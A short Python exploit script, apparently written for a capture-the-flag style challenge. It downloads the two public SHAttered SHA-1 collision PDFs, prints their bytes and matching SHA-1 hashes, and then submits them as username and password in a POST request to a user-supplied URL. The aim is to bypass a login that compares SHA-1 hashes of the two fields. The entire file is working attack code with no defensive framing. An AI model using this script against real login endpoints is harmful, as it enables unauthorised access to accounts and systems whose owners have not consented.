import base64
import hashlib
import requests
import sys

if len(sys.argv) != 2:
    print(f"Usage {sys.argv[0]} <url>")
    exit(1)

url = sys.argv[1]
pdf1 = "https://shattered.io/static/shattered-1.pdf"
pdf2 = "https://shattered.io/static/shattered-2.pdf"

print("[*] Getting pdf1 content")
pdf1_bytes = requests.get(pdf1).content
print("[*] Getting pdf2 content")
pdf2_bytes = requests.get(pdf2).content

# Print raw byte content (this can be messy in terminal)
print("\n[*] Raw pdf1_bytes:")
print(pdf1_bytes)
print("\n[*] Raw pdf2_bytes:")
print(pdf2_bytes)

# Show SHA-1 hashes to confirm collision
print("[*] SHA-1 hash of pdf1:", hashlib.sha1(pdf1_bytes).hexdigest())
print("[*] SHA-1 hash of pdf2:", hashlib.sha1(pdf2_bytes).hexdigest())

# Show base64 snippets (first 128 bytes)
print("\n[*] pdf1_bytes (base64 preview):")
print(base64.b64encode(pdf1_bytes[:128]).decode())

print("\n[*] pdf2_bytes (base64 preview):")
print(base64.b64encode(pdf2_bytes[:128]).decode())

# Prepare POST data
data = {
    "username": pdf2_bytes,
    "pwd": pdf1_bytes
}

print("\n[*] Sending POST request...")
res = requests.post(url, data=data)
print("[*] Response:\n", res.text)
